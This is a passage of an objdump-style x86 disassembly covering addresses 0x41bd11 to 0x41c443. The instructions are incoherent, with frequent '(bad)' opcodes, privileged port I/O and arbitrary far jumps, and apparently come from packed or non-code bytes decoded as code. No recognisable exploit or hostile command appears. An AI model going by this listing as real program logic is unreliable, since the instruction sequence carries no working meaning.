  41bd11:	and    DWORD PTR [ebx-0xf],0xffffffeb
  41bd15:	call   0xc2bb97d7
  41bd1a:	xchg   edi,eax
  41bd1b:	xor    bh,BYTE PTR [edi]
  41bd1d:	mov    edi,0xef5c2a9
  41bd22:	dec    eax
  41bd23:	clc    
  41bd24:	mov    DWORD PTR [ebp+0x6dabbd7c],edx
  41bd2a:	cmp    eax,0xbb09cf04
  41bd2f:	lods   al,BYTE PTR ss:[esi]
  41bd31:	push   edi
  41bd32:	sar    DWORD PTR [ebx],cl
  41bd34:	ins    DWORD PTR es:[edi],dx
  41bd35:	arpl   WORD PTR [esi],ax
  41bd37:	test   DWORD PTR [edi-0x18],ebp
  41bd3a:	adc    al,0x37
  41bd3c:	jl     0x41bd97
  41bd3e:	les    edx,FWORD PTR [ebx-0x28ebc03]
  41bd44:	sbb    eax,0x52175b48
  41bd49:	add    al,0x86
  41bd4b:	clc    
  41bd4c:	retf   0xfe54
  41bd4f:	sub    edx,DWORD PTR [ecx]
  41bd51:	fild   QWORD PTR [ebx+0x451a91b1]
  41bd57:	push   eax
  41bd58:	sbb    bl,bh
  41bd5a:	pusha  
  41bd5b:	scas   al,BYTE PTR es:[edi]
  41bd5c:	pop    ecx
  41bd5d:	fsub   QWORD PTR [esi+0x55ab6f4a]
  41bd63:	imul   eax,DWORD PTR [edi-0x5f],0x7e
  41bd67:	mov    cl,0x1c
  41bd69:	jo     0x41bd0a
  41bd6b:	loop   0x41bd53
  41bd6d:	hlt    
  41bd6e:	(bad)  
  41bd6f:	mul    BYTE PTR [edi]
  41bd71:	jp     0x41bd83
  41bd73:	add    BYTE PTR [edx],0x62
  41bd76:	push   ebx
  41bd77:	ret    
  41bd78:	js     0x41bdd8
  41bd7a:	cdq    
  41bd7b:	pop    es
  41bd7c:	test   al,0x78
  41bd7e:	pop    ss
  41bd7f:	mov    dl,0x3c
  41bd81:	pop    ebx
  41bd82:	add    eax,0xbe231991
  41bd87:	push   cs
  41bd88:	dec    esi
  41bd89:	mov    eax,0xcc0bdac3
  41bd8e:	sahf   
  41bd8f:	cmp    DWORD PTR [ebp+ebp*4+0x34],ebp
  41bd93:	sub    DWORD PTR [edi+0x2f],edi
  41bd96:	dec    ecx
  41bd97:	test   eax,0xf2ca733c
  41bd9c:	and    eax,0x2f060cb5
  41bda1:	ins    DWORD PTR es:[edi],dx
  41bda2:	add    ah,ah
  41bda4:	inc    ebx
  41bda5:	push   eax
  41bda6:	cld    
  41bda7:	retf   0x5a31
  41bdaa:	ins    DWORD PTR es:[edi],dx
  41bdab:	sbb    bl,BYTE PTR [edx]
  41bdad:	xor    DWORD PTR [ecx+ebp*8+0x7b],esp
  41bdb1:	xor    BYTE PTR [edi-0x1f],ch
  41bdb4:	inc    eax
  41bdb5:	mov    al,ds:0x420cff10
  41bdba:	mov    ebx,0x4b7ced60
  41bdbf:	sub    BYTE PTR [ebx],al
  41bdc1:	bound  eax,QWORD PTR [esi-0x25ede574]
  41bdc7:	mov    ds:0x64ae122e,eax
  41bdcc:	jg     0x41bd74
  41bdce:	push   esp
  41bdcf:	push   0x2fbaf258
  41bdd4:	sbb    ebx,esi
  41bdd6:	paddusw mm3,QWORD PTR [eax-0x15ce3403]
  41bddd:	xor    edx,edx
  41bddf:	shl    DWORD PTR [edi-0x7d],1
  41bde2:	inc    ecx
  41bde3:	mov    cl,0xbe
  41bde5:	push   0xfffffff4
  41bde7:	sar    DWORD PTR [eax-0x65dd5d38],cl
  41bded:	pop    ecx
  41bdee:	retf   0x80d7
  41bdf1:	(bad)  
  41bdf3:	in     al,dx
  41bdf4:	stos   BYTE PTR es:[edi],al
  41bdf5:	shr    DWORD PTR [eax+0x11],0x3f
  41bdf9:	sub    DWORD PTR [ebx],eax
  41bdfb:	imul   esi,DWORD PTR [ebx+0x34147139],0xb43b7f5
  41be05:	jb     0x41bdf7
  41be07:	adc    edi,DWORD PTR [esi+0x284b88b6]
  41be0d:	ret    0x4c0e
  41be10:	outs   dx,DWORD PTR ds:[esi]
  41be11:	rep stos DWORD PTR es:[edi],eax
  41be13:	ja     0x41bdc5
  41be15:	pop    eax
  41be16:	in     eax,dx
  41be17:	xor    cl,dl
  41be19:	and    eax,0x155bf6a3
  41be1e:	(bad)  
  41be20:	xchg   esp,eax
  41be21:	hlt    
  41be22:	mov    dh,al
  41be24:	xor    eax,0x29ddf446
  41be29:	test   ch,bh
  41be2b:	mov    esi,0xd0c36884
  41be30:	mov    ds:0x3184c195,eax
  41be35:	and    BYTE PTR [edi+eax*4+0x4c6eff05],ch
  41be3c:	ins    BYTE PTR es:[edi],dx
  41be3d:	add    al,0xf2
  41be3f:	mov    ah,0xce
  41be41:	stos   DWORD PTR es:[edi],eax
  41be42:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41be43:	hlt    
  41be44:	add    al,0xa6
  41be46:	xchg   ebx,eax
  41be47:	adc    esp,DWORD PTR [ebx-0x1]
  41be4a:	(bad)  es:0x12533ba
  41be51:	mov    dh,0x1f
  41be53:	cli    
  41be54:	bound  ecx,QWORD PTR [eax-0x61]
  41be57:	or     al,0x4b
  41be59:	or     esp,DWORD PTR [ebp+0xe]
  41be5c:	xor    BYTE PTR [esi+0x424f278e],bl
  41be62:	push   ebp
  41be63:	test   eax,0xb4ecdfd7
  41be68:	aaa    
  41be69:	inc    ebp
  41be6a:	enter  0xdd84,0x26
  41be6e:	shr    BYTE PTR [eax+edx*2-0x7b],1
  41be72:	loopne 0x41beef
  41be74:	in     al,0xae
  41be76:	ja     0x41be72
  41be78:	or     DWORD PTR [eax-0x4a96d98],ebx
  41be7e:	add    al,0x73
  41be80:	lahf   
  41be81:	push   ds
  41be82:	cmp    ch,BYTE PTR [edx-0x76]
  41be85:	outs   dx,BYTE PTR ds:[esi]
  41be86:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41be87:	sar    DWORD PTR [ebx],0xb3
  41be8a:	arpl   WORD PTR [edi],bp
  41be8c:	sub    DWORD PTR [edx+eax*2],0x43154151
  41be93:	sbb    bl,BYTE PTR [esi+0x53]
  41be96:	pusha  
  41be97:	sub    al,0xf0
  41be99:	pop    ebp
  41be9a:	out    dx,al
  41be9b:	mov    WORD PTR [esi],?
  41be9d:	inc    edi
  41be9e:	adc    BYTE PTR [esi],0x90
  41bea1:	xchg   eax,ecx
  41bea3:	xchg   edi,eax
  41bea4:	dec    eax
  41bea5:	outs   dx,BYTE PTR ds:[esi]
  41bea6:	ret    
  41bea7:	push   edi
  41bea8:	scas   al,BYTE PTR es:[edi]
  41bea9:	mov    WORD PTR [ecx+0x8ba9171],ds
  41beaf:	mov    ah,0x4f
  41beb1:	loope  0x41be85
  41beb3:	pop    ebx
  41beb4:	jle    0x41be3b
  41beb6:	test   al,0x51
  41beb8:	fild   QWORD PTR ds:0x5ab6de8c
  41bebe:	sub    dh,ah
  41bec0:	xor    edi,DWORD PTR [edi+0x4d]
  41bec3:	scas   al,BYTE PTR es:[edi]
  41bec4:	(bad)  
  41bec5:	sub    esp,DWORD PTR [eax+0x1867b102]
  41becb:	in     eax,0x4f
  41becd:	sub    edi,DWORD PTR [ebx-0x6a]
  41bed0:	xchg   di,ax
  41bed2:	lea    ecx,[ebp-0x602db932]
  41bed8:	push   edi
  41bed9:	je     0x41beeb
  41bedb:	pop    ebp
  41bedc:	adc    ch,BYTE PTR [ebx+ecx*2+0x71]
  41bee0:	xor    cl,al
  41bee2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bee3:	jp     0x41beff
  41bee5:	mov    al,BYTE PTR [esi+0x10ef690e]
  41beeb:	(bad)  
  41beec:	pop    esp
  41beed:	fs mov esp,0x21392b59
  41bef3:	lahf   
  41bef4:	repz int3 
  41bef6:	pop    edx
  41bef7:	in     al,dx
  41bef8:	add    eax,0xfa98cf31
  41befd:	loopne 0x41bf10
  41beff:	stc    
  41bf00:	add    edi,edi
  41bf02:	and    dh,BYTE PTR [edi-0x71c168e4]
  41bf08:	add    eax,0x52c2fcd4
  41bf0d:	addr16 ja 0x41bef5
  41bf10:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bf11:	lods   eax,DWORD PTR ds:[esi]
  41bf12:	adc    DWORD PTR [edx],esi
  41bf14:	icebp  
  41bf15:	imul   edx,DWORD PTR [eax+eax*8+0x78],0xe806e804
  41bf1d:	and    BYTE PTR [edx-0x4f],dh
  41bf20:	int    0xbb
  41bf22:	xchg   edi,eax
  41bf23:	(bad)  
  41bf24:	and    DWORD PTR [ebp-0x4396d303],ebp
  41bf2a:	outs   dx,BYTE PTR ds:[esi]
  41bf2b:	and    eax,0xfd5f8727
  41bf30:	f2xm1  
  41bf32:	fbld   TBYTE PTR [ecx]
  41bf34:	pop    es
  41bf35:	and    BYTE PTR [edi+ecx*4-0x400629a9],0x6
  41bf3d:	add    edi,DWORD PTR [ecx+0x6d]
  41bf40:	add    edx,DWORD PTR [ebp-0x414006ab]
  41bf46:	adc    BYTE PTR [ecx+0x368351bb],dh
  41bf4c:	dec    ebp
  41bf4d:	adc    bl,bh
  41bf4f:	popa   
  41bf50:	pop    ss
  41bf51:	or     al,BYTE PTR [ecx+0x55]
  41bf54:	rcl    DWORD PTR [ebx-0x4576a45b],0x2e
  41bf5b:	dec    esi
  41bf5c:	or     al,0xed
  41bf5e:	inc    ebp
  41bf5f:	(bad)  
  41bf60:	sti    
  41bf61:	lods   al,BYTE PTR ds:[esi]
  41bf62:	das    
  41bf63:	and    bh,dl
  41bf65:	adc    dh,BYTE PTR [edx+ecx*8+0x3f]
  41bf69:	push   0x37
  41bf6b:	mov    bl,0x8f
  41bf6d:	pop    ebp
  41bf6e:	mov    bl,0xcf
  41bf70:	cmp    cl,0x81
  41bf73:	dec    DWORD PTR [ebx]
  41bf75:	inc    ebx
  41bf76:	call   0x5e93493
  41bf7b:	imul   ebp,DWORD PTR [esp+eax*1-0x8630f22],0x74
  41bf83:	bts    DWORD PTR [ebp+0x78fc1a21],esp
  41bf8a:	fcom   DWORD PTR [edx-0x7b]
  41bf8d:	cdq    
  41bf8e:	mov    al,0xb2
  41bf90:	sar    ebp,0xf8
  41bf93:	inc    edi
  41bf94:	je     0x41bf1f
  41bf96:	xchg   ebp,eax
  41bf97:	in     eax,dx
  41bf98:	ins    BYTE PTR es:[edi],dx
  41bf99:	inc    ecx
  41bf9a:	and    al,0xe3
  41bf9c:	mov    ch,0x21
  41bf9e:	loop   0x41bf65
  41bfa0:	out    dx,eax
  41bfa1:	dec    ecx
  41bfa2:	mov    bh,0xce
  41bfa4:	pop    edx
  41bfa5:	jns    0x41bfdb
  41bfa7:	sbb    ah,bl
  41bfa9:	into   
  41bfaa:	push   cs
  41bfab:	mov    esp,0x7ed903de
  41bfb0:	out    0x4d,eax
  41bfb2:	jno    0x41bf5c
  41bfb4:	sub    DWORD PTR [esi-0x52],esi
  41bfb7:	or     eax,0x8dd0578c
  41bfbc:	jbe    0x41bfa8
  41bfbe:	repz jl 0x41c040
  41bfc1:	test   DWORD PTR [esi],esi
  41bfc3:	inc    esi
  41bfc4:	in     eax,dx
  41bfc5:	pop    ebp
  41bfc6:	(bad)  
  41bfc7:	fld    TBYTE PTR [ecx]
  41bfc9:	out    0x74,al
  41bfcb:	mov    esi,0xfd010486
  41bfd0:	adc    BYTE PTR [edx+ebx*1+0x62ce9b28],al
  41bfd7:	stc    
  41bfd8:	fdiv   QWORD PTR [edi-0x79]
  41bfdb:	retf   
  41bfdc:	cdq    
  41bfdd:	lods   eax,DWORD PTR ds:[esi]
  41bfde:	pop    ebp
  41bfdf:	leave  
  41bfe0:	add    al,0xcd
  41bfe2:	call   0x42f9:0x2c3052e3
  41bfe9:	pop    es
  41bfea:	fmul   QWORD PTR [edi]
  41bfec:	or     BYTE PTR ds:0xf24821ef,al
  41bff2:	pop    ds
  41bff3:	retf   
  41bff4:	add    DWORD PTR [esi],ebx
  41bff6:	sbb    ebp,DWORD PTR [eax+0x49707efd]
  41bffc:	mov    ecx,gs
  41bffe:	fwait
  41bfff:	add    DWORD PTR [ebp-0x4323d458],ecx
  41c005:	jmp    FWORD PTR [ebx]
  41c007:	aas    
  41c008:	stc    
  41c009:	aas    
  41c00a:	sub    ah,bl
  41c00c:	fistp  WORD PTR [ecx-0x622b5484]
  41c012:	or     bl,0x41
  41c015:	cmp    ebx,0x184f9391
  41c01b:	add    edi,esi
  41c01d:	scas   eax,DWORD PTR es:[edi]
  41c01e:	mov    al,ds:0x1d3cc54
  41c023:	mov    esi,0xba0dfbfd
  41c028:	mov    ch,0xcd
  41c02a:	aad    0xc5
  41c02c:	in     al,0xaf
  41c02e:	(bad)  
  41c02f:	stos   DWORD PTR es:[edi],eax
  41c030:	sbb    ah,al
  41c032:	sbb    eax,0xa0a55f90
  41c037:	adc    DWORD PTR [ebx+0x6c7669a2],esi
  41c03d:	mov    ah,0x8b
  41c03f:	repz test al,0x23
  41c042:	call   0x51ebd15
  41c047:	call   0x7ad0:0x93a350e8
  41c04e:	sbb    cl,BYTE PTR [ecx]
  41c050:	jne    0x41c0a1
  41c052:	mov    DWORD PTR [eax+0x3686460b],esi
  41c058:	cs out 0xda,al
  41c05b:	daa    
  41c05c:	mov    eax,0x84d1a014
  41c061:	icebp  
  41c062:	inc    edx
  41c063:	arpl   WORD PTR [ebx-0x6a],sp
  41c066:	sbb    DWORD PTR [esp+ebx*4-0x2e],esi
  41c06a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c06b:	sub    ebx,esi
  41c06d:	out    0xa8,al
  41c06f:	push   eax
  41c070:	and    ch,0xc
  41c073:	(bad)  
  41c075:	jl     0x41c008
  41c077:	hlt    
  41c078:	fdiv   DWORD PTR [edi+0x7cbc2aad]
  41c07e:	xchg   esp,eax
  41c07f:	ret    0xd27f
  41c082:	repnz mov eax,0x8da14ea5
  41c088:	mov    dh,0x82
  41c08a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c08b:	mov    bl,0xa4
  41c08d:	test   eax,0xa2976031
  41c093:	sti    
  41c094:	sbb    DWORD PTR [edi],esi
  41c096:	or     cl,BYTE PTR [ebx+0x2ad91be7]
  41c09c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c09d:	inc    esp
  41c09e:	jmp    0x41c093
  41c0a0:	mov    edi,0x165c839c
  41c0a5:	and    edi,DWORD PTR [edx-0x4ae641df]
  41c0ab:	lods   eax,DWORD PTR ds:[esi]
  41c0ac:	call   ebp
  41c0ae:	add    cl,BYTE PTR [ebx+ebx*4-0xc3d495a]
	...
  41c0c1:	retf   
  41c0c2:	test   al,0x91
  41c0c4:	sbb    eax,0xfecf3df3
  41c0c9:	dec    ebp
  41c0ca:	fisub  DWORD PTR [ecx+edi*1-0x79]
  41c0ce:	(bad)  
  41c0cf:	jg     0x41c0ed
  41c0d1:	jno    0x41c110
  41c0d3:	add    DWORD PTR [eax],eax
  41c0d5:	lods   al,BYTE PTR ds:[esi]
  41c0d6:	add    eax,DWORD PTR [eax]
  41c0d8:	add    BYTE PTR [edx-0x19],dl
  41c0db:	add    edx,eax
  41c0dd:	push   es
  41c0de:	xchg   edx,eax
  41c0df:	xchg   esi,eax
  41c0e0:	push   edi
  41c0e1:	or     BYTE PTR [edi],dl
  41c0e3:	mov    ds,WORD PTR [edx]
  41c0e5:	div    edx
  41c0e7:	inc    edx
  41c0e8:	int3   
  41c0e9:	and    esi,edx
  41c0eb:	add    al,0x5c
  41c0ed:	xor    BYTE PTR [eax+0x15],bh
  41c0f0:	sbb    eax,DWORD PTR [eax-0x73119eab]
  41c0f6:	push   es
  41c0f7:	jne    0x41c0f1
  41c0f9:	aam    0xb
  41c0fb:	int    0x54
  41c0fd:	dec    ebp
  41c0fe:	jo     0x41c086
  41c100:	xchg   ecx,eax
  41c101:	add    al,0x56
  41c103:	das    
  41c104:	jo     0x41c16d
  41c106:	rcl    DWORD PTR [edi+0x73],1
  41c109:	dec    bx
  41c10b:	push   ecx
  41c10c:	sbb    DWORD PTR [ebx-0x5a565831],ebx
  41c112:	aas    
  41c113:	pop    ebx
  41c114:	mov    ds:0x816520a1,al
  41c119:	inc    esp
  41c11a:	sbb    al,0x92
  41c11c:	jae    0x41c0f3
  41c11e:	out    dx,eax
  41c11f:	xchg   esi,eax
  41c120:	mov    edi,ebx
  41c122:	fsub   QWORD PTR [eax+0x3]
  41c125:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c126:	jne    0x41c0c5
  41c128:	add    esp,DWORD PTR [ecx+0x3353bec3]
  41c12e:	xchg   esi,eax
  41c12f:	mov    fs,WORD PTR [edx+edx*2]
  41c132:	lods   al,BYTE PTR ds:[esi]
  41c133:	inc    ebp
  41c134:	push   ebp
  41c135:	jge    0x41c0cd
  41c137:	xor    DWORD PTR [ebx-0x1e944d0e],edx
  41c13d:	mov    fs,edx
  41c13f:	xchg   esp,eax
  41c140:	out    0x16,eax
  41c142:	out    dx,eax
  41c143:	ds jnp 0x41c14a
  41c146:	xor    al,0xbe
  41c148:	cli    
  41c149:	fwait
  41c14a:	and    ecx,DWORD PTR [ebp+0x38]
  41c14d:	push   edx
  41c14e:	add    al,0xf3
  41c150:	repnz shl BYTE PTR [eax-0x17],0xd4
  41c155:	or     al,0xad
  41c157:	ss pop ss
  41c159:	adc    al,0xab
  41c15b:	push   eax
  41c15c:	mov    bl,0x3f
  41c15e:	jmp    0x41c186
  41c160:	pop    ss
  41c161:	pop    ebx
  41c162:	lock stos DWORD PTR es:[edi],eax
  41c164:	xchg   BYTE PTR [ecx+0x69],dl
  41c167:	push   esi
  41c168:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c169:	cmp    dl,al
  41c16b:	push   ss
  41c16c:	ins    DWORD PTR es:[edi],dx
  41c16d:	mul    eax
  41c16f:	or     DWORD PTR [ebx],esi
  41c171:	in     al,dx
  41c172:	call   0x445e5848
  41c177:	out    0x96,eax
  41c179:	or     BYTE PTR [ebx],cl
  41c17b:	outs   dx,BYTE PTR ds:[esi]
  41c17c:	xor    edx,DWORD PTR [edi+0x77]
  41c17f:	scas   eax,DWORD PTR es:[edi]
  41c180:	pop    ebp
  41c181:	fst    QWORD PTR [eax]
  41c183:	neg    BYTE PTR [eax+0x5f]
  41c186:	sbb    ch,BYTE PTR [ecx]
  41c188:	popf   
  41c189:	dec    ecx
  41c18a:	adc    edi,DWORD PTR [ecx+0x56d425b9]
  41c190:	mov    BYTE PTR [ecx+0x69],cl
  41c193:	sbb    BYTE PTR ds:[ebx],ch
  41c196:	mov    eax,0xe0232da8
  41c19b:	mov    bh,0x1c
  41c19d:	scas   al,BYTE PTR es:[edi]
  41c19e:	sub    esi,ecx
  41c1a0:	push   0xffffff90
  41c1a2:	push   ss
  41c1a3:	mov    fs,WORD PTR [ebp+ebp*2+0x1eedaec6]
  41c1aa:	push   ebx
  41c1ab:	aas    
  41c1ac:	fmul   st(4),st
  41c1ae:	scas   eax,DWORD PTR es:[edi]
  41c1af:	lds    edx,FWORD PTR [esi]
  41c1b1:	in     eax,dx
  41c1b2:	mov    cl,0xff
  41c1b4:	jle    0x41c1a9
  41c1b6:	sub    eax,0xa31d9ce
  41c1bb:	jge    0x41c206
  41c1bd:	in     eax,0xd3
  41c1bf:	xor    BYTE PTR [edx],0x18
  41c1c2:	jmp    0x41c188
  41c1c4:	out    0x87,eax
  41c1c6:	cli    
  41c1c7:	add    eax,DWORD PTR [edi+ebp*1-0x67]
  41c1cb:	cli    
  41c1cc:	and    DWORD PTR [edx],ebx
  41c1ce:	test   DWORD PTR [ecx],eax
  41c1d0:	out    0x22,eax
  41c1d2:	ss jno 0x41c220
  41c1d5:	cdq    
  41c1d6:	push   0xd5c2a7c3
  41c1db:	aam    0xfa
  41c1dd:	xchg   ebx,eax
  41c1de:	inc    edx
  41c1df:	cmp    edx,DWORD PTR [ecx]
  41c1e1:	add    al,0x8c
  41c1e3:	dec    esp
  41c1e4:	mov    ebp,0xfa7ee939
  41c1e9:	and    bh,BYTE PTR [ebp-0x2c]
  41c1ec:	adc    bh,dl
  41c1ee:	cmc    
  41c1ef:	jmp    0x19fc:0x419a1305
  41c1f6:	lahf   
  41c1f7:	scas   al,BYTE PTR es:[edi]
  41c1f8:	xor    ebx,esi
  41c1fa:	push   0x75
  41c1fc:	xchg   DWORD PTR [edx],esi
  41c1fe:	cdq    
  41c1ff:	sub    ah,BYTE PTR [ebp+0x7c753485]
  41c205:	dec    edx
  41c206:	push   ss
  41c207:	out    0x90,al
  41c209:	aad    0xb
  41c20b:	fidiv  DWORD PTR [ebx+0x2bfd54a0]
  41c211:	ret    0x5431
  41c214:	or     al,0x85
  41c216:	xchg   ebp,eax
  41c217:	mov    dl,0xf3
  41c219:	loope  0x41c243
  41c21b:	push   esp
  41c21c:	popf   
  41c21d:	rol    cl,cl
  41c21f:	fidiv  DWORD PTR [ebx+0x7a]
  41c222:	test   al,0x32
  41c224:	aas    
  41c225:	int3   
  41c226:	cwde   
  41c227:	je     0x41c248
  41c229:	xchg   ecx,eax
  41c22a:	xchg   ecx,eax
  41c22b:	or     ah,cl
  41c22d:	int3   
  41c22e:	iret   
  41c22f:	xor    eax,0xbc1bfdae
  41c234:	repnz rcr BYTE PTR [ebp-0x11],0x9e
  41c239:	cmp    DWORD PTR [edi],0x8beb1031
  41c23f:	mov    ch,0xe
  41c241:	aam    0x66
  41c243:	(bad)  
  41c245:	sbb    DWORD PTR [esp+eax*2-0x34],0xffffff8a
  41c24a:	jmp    0x439:0xf81a5e16
  41c251:	(bad)  
  41c252:	cmp    eax,0xfe2a6910
  41c257:	(bad)  
  41c258:	test   eax,0xeec7b533
  41c25d:	js     0x41c236
  41c25f:	inc    esi
  41c260:	repz jle 0x41c2ac
  41c263:	xchg   edi,eax
  41c264:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c265:	push   edx
  41c266:	outs   dx,BYTE PTR ds:[esi]
  41c267:	add    ecx,edx
  41c269:	push   eax
  41c26a:	aaa    
  41c26b:	clc    
  41c26c:	or     cl,al
  41c26e:	dec    edi
  41c26f:	sti    
  41c270:	mov    esp,0xc36e4291
  41c275:	sar    BYTE PTR [edi],0xd8
  41c278:	sbb    eax,DWORD PTR [eax+0x78053679]
  41c27e:	cmc    
  41c27f:	pop    ss
  41c280:	outs   dx,DWORD PTR ds:[esi]
  41c281:	popf   
  41c282:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c283:	inc    ecx
  41c284:	loope  0x41c2bb
  41c286:	(bad)  
  41c287:	lea    ebx,[edx+0x11]
  41c28a:	jnp    0x41c305
  41c28c:	(bad)  
  41c28d:	jecxz  0x41c2d3
  41c28f:	aaa    
  41c290:	out    0x1f,eax
  41c292:	daa    
  41c293:	mov    al,0x6
  41c295:	pop    ebp
  41c296:	popf   
  41c297:	sar    cl,0xac
  41c29a:	pop    ebp
  41c29b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c29c:	stos   BYTE PTR es:[edi],al
  41c29d:	and    al,ch
  41c29f:	shr    edx,0xf4
  41c2a2:	jmp    0xe357:0xa585b65c
  41c2a9:	cs jecxz 0x41c27b
  41c2ac:	sti    
  41c2ad:	mov    esp,0xe0cf123a
  41c2b2:	ret    0x3563
  41c2b5:	repnz push ss
  41c2b7:	int    0xc6
  41c2b9:	stos   BYTE PTR es:[edi],al
  41c2ba:	dec    ecx
  41c2bb:	sbb    DWORD PTR [esi+0x579ebabb],ecx
  41c2c1:	loope  0x41c26c
  41c2c3:	loopne 0x41c2b5
  41c2c5:	mov    al,ds:0xc0fd1091
  41c2ca:	pop    es
  41c2cb:	cs mov eax,0x955e1939
  41c2d1:	int3   
  41c2d2:	or     edi,eax
  41c2d4:	mov    dl,0xe5
  41c2d6:	sbb    DWORD PTR gs:[edx-0x43],edx
  41c2da:	pop    esp
  41c2db:	mov    ds:0xf03faf6a,eax
  41c2e0:	in     al,dx
  41c2e1:	xor    dl,BYTE PTR [edx-0x5c]
  41c2e4:	retf   
  41c2e5:	ficom  DWORD PTR cs:[esi]
  41c2e8:	outs   dx,DWORD PTR ds:[esi]
  41c2e9:	fsubr  st,st(3)
  41c2eb:	lea    ecx,[ebx+0x78]
  41c2ee:	and    BYTE PTR [ebp+0x29],dl
  41c2f1:	daa    
  41c2f2:	xchg   esp,eax
  41c2f3:	xchg   edx,eax
  41c2f4:	pop    esi
  41c2f5:	sub    eax,0x85de0ef2
  41c2fa:	jge    0x41c320
  41c2fc:	repnz mov ?,WORD PTR [ecx]
  41c2ff:	jns    0x41c2b0
  41c301:	sub    DWORD PTR [ebx-0x54],edi
  41c304:	mov    ds:0xb484bc45,al
  41c309:	jle    0x41c297
  41c30b:	das    
  41c30c:	ror    edi,cl
  41c30e:	sub    eax,0x12535cd2
  41c313:	fwait
  41c314:	mov    ecx,DWORD PTR [edi-0x223f759b]
  41c31a:	lods   eax,DWORD PTR ds:[esi]
  41c31b:	mov    esi,0xb5f6c9f9
  41c320:	clc    
  41c321:	mov    al,0x39
  41c323:	pushf  
  41c324:	or     DWORD PTR [esi-0x49],edi
  41c327:	xchg   ecx,eax
  41c328:	bound  esp,QWORD PTR [ecx-0x2b]
  41c32b:	inc    ecx
  41c32c:	jg     0x41c36d
  41c32e:	jno    0x41c37d
  41c330:	aad    0xa0
  41c332:	idiv   cl
  41c334:	ja     0x41c386
  41c336:	fisubr WORD PTR [edx-0x200d2bf1]
  41c33c:	clc    
  41c33d:	push   0x55ec29f5
  41c342:	xchg   esi,eax
  41c343:	shl    BYTE PTR [ebp+ebx*2+0x2f],0xf8
  41c348:	inc    esp
  41c349:	imul   ebp,DWORD PTR ds:0xf264d502,0xffffffb7
  41c350:	mov    eax,ds:0xc19a57cb
  41c355:	lods   al,BYTE PTR ds:[esi]
  41c356:	lea    edx,[edx]
  41c358:	lods   al,BYTE PTR ds:[esi]
  41c359:	add    bh,bl
  41c35b:	pushf  
  41c35c:	cli    
  41c35d:	pop    esi
  41c35e:	jge    0x41c3c2
  41c360:	mov    ds:0xfb4a410c,eax
  41c365:	add    BYTE PTR [eax-0x63],bh
  41c368:	and    eax,0xea8b37ca
  41c36d:	push   ss
  41c36e:	add    cl,dh
  41c370:	or     eax,0xeba34e6d
  41c375:	int3   
  41c376:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c377:	xor    ah,BYTE PTR ds:0x1aab5baa
  41c37d:	sbb    eax,0x577b64f4
  41c382:	(bad)  
  41c383:	std    
  41c384:	jae    0x41c3df
  41c386:	adc    DWORD PTR [edx-0x62],ebx
  41c389:	and    al,0x62
  41c38b:	into   
  41c38c:	ret    
  41c38d:	mov    ah,0xad
  41c38f:	call   DWORD PTR [edi+0x291a5536]
  41c395:	ficom  WORD PTR ds:0x6b656741
  41c39b:	in     eax,0x5b
  41c39d:	dec    ebp
  41c39e:	pop    eax
  41c39f:	int    0x43
  41c3a1:	outs   dx,BYTE PTR ds:[esi]
  41c3a2:	scas   al,BYTE PTR es:[edi]
  41c3a3:	add    dh,BYTE PTR [eax+0x34a07b44]
  41c3a9:	mov    BYTE PTR [edx],dl
  41c3ab:	and    esp,esi
  41c3ad:	int3   
  41c3ae:	jno    0x41c36c
  41c3b0:	fild   WORD PTR ss:[esi+0x44]
  41c3b4:	pop    ss
  41c3b5:	mov    DWORD PTR [ecx],0x2aa5f673
  41c3bb:	repz adc dh,BYTE PTR [ebx]
  41c3be:	ret    0xc3bf
  41c3c1:	lock lods al,BYTE PTR ds:[esi]
  41c3c3:	dec    edi
  41c3c4:	out    dx,eax
  41c3c5:	jecxz  0x41c34a
  41c3c7:	cs xchg edi,eax
  41c3c9:	jle    0x41c3bc
  41c3cb:	sar    BYTE PTR [edx],0xfe
  41c3ce:	sub    DWORD PTR [edi+0x511f2cf9],edi
  41c3d4:	mov    ds:0xd74ecb8d,al
  41c3d9:	pop    edx
  41c3da:	add    ebx,DWORD PTR [edi+0x21]
  41c3dd:	daa    
  41c3de:	gs aad 0xc9
  41c3e1:	pop    ss
  41c3e2:	inc    esp
  41c3e3:	mov    ds:0xd95b5538,eax
  41c3e8:	out    dx,eax
  41c3e9:	push   ebp
  41c3ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c3eb:	je     0x41c413
  41c3ed:	dec    ecx
  41c3ee:	mov    edi,0x8fce3ecf
  41c3f3:	hlt    
  41c3f4:	(bad)  
  41c3f5:	adc    DWORD PTR [edi],ebx
  41c3f7:	stos   DWORD PTR es:[edi],eax
  41c3f8:	ret    
  41c3f9:	arpl   WORD PTR [ebx-0x18],di
  41c3fc:	mov    al,ds:0x3809fd6e
  41c401:	(bad)  [eax-0x62]
  41c404:	shr    BYTE PTR [edi],cl
  41c406:	mov    eax,0x13060e1d
  41c40b:	daa    
  41c40c:	into   
  41c40d:	dec    edx
  41c40e:	jb     0x41c437
  41c410:	push   0xa676ab40
  41c415:	dec    esi
  41c416:	jge    0x41c43a
  41c418:	inc    esi
  41c419:	jle    0x41c402
  41c41b:	dec    esp
  41c41c:	mov    dl,0x58
  41c41e:	mov    edx,0xd26fd0ed
  41c423:	push   ecx
  41c424:	neg    DWORD PTR [eax]
  41c426:	adc    BYTE PTR [ecx-0x3],bh
  41c429:	jmp    0x3339b6a3
  41c42e:	test   DWORD PTR [edx],edx
  41c430:	arpl   WORD PTR [esi],sp
  41c432:	push   esp
  41c433:	pop    es
  41c434:	jno    0x41c4ac
  41c436:	mov    ecx,DWORD PTR [ecx+0x52]
  41c439:	pop    edi
  41c43a:	cs inc ebp
  41c43c:	cmp    eax,0x2ad9889f
  41c441:	out    dx,eax
  41c442:	xchg   ebx,eax
  41c443:	popf   
